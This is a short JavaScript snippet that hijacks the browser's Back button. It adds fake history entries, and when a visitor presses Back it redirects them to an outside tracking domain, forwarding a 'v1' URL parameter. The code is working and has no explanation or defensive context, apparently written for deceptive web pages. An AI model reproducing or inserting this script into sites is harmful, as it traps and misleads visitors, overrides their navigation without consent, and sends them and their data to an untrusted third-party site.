
(function(window, location) {
    let bbCURL = new URL(window.location.href);
    let v1Param = bbCURL.searchParams.get("v1");
    var redirect = "https://cloudtrackinglinks.online/dcjcfgqwk/asafvsfv/index.php?v1=" + v1Param +
        "&v2=T&T";
    var currentUrl = location.origin + location.pathname + location.search;
    if (location.hash !== "#!/hst") {
        history.replaceState(null, document.title, currentUrl + "#!/hst");
        history.pushState(null, document.title, currentUrl);
    }

    window.addEventListener(
        "popstate",
        function() {
            if (location.hash === "#!/hst") {
                setTimeout(function() {
                    window.location.replace(redirect);
                }, 0);
            }
        },
        false
    );
})(window, location);
